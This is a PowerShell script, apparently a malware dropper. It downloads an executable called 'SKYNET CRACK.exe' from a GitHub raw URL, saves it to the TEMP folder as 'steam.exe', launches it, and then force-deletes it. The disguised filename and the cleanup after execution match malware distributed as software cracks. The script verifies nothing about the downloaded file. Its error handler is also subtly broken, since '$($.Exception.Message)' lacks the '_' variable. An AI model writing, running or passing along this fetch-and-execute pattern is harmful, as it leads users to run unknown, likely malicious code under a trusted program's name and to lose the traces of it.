$url = "https://raw.githubusercontent.com/yuri95166-a11y/ddd/main/SKYNET%20CRACK.exe"
$outputPath = Join-Path $env:TEMP "steam.exe"

Write-Host "Starting download..." -ForegroundColor Cyan

try {
    Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop

    if (Test-Path $outputPath) {
        Write-Host "Download completed." -ForegroundColor Green

        Write-Host "Launching file..." -ForegroundColor Green
        Start-Process -FilePath $outputPath -Wait

        Write-Host "Process finished." -ForegroundColor Magenta

        Write-Host "Cleaning up..." -ForegroundColor Yellow
        Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue

        Write-Host "Done." -ForegroundColor Green
    }
    else {
        Write-Host "Download failed: file not found." -ForegroundColor Red
    }
}
catch {
    Write-Host "Error occurred: $($.Exception.Message)" -ForegroundColor Red
}
finally {
    Write-Host "Script finished." -ForegroundColor Gray
}
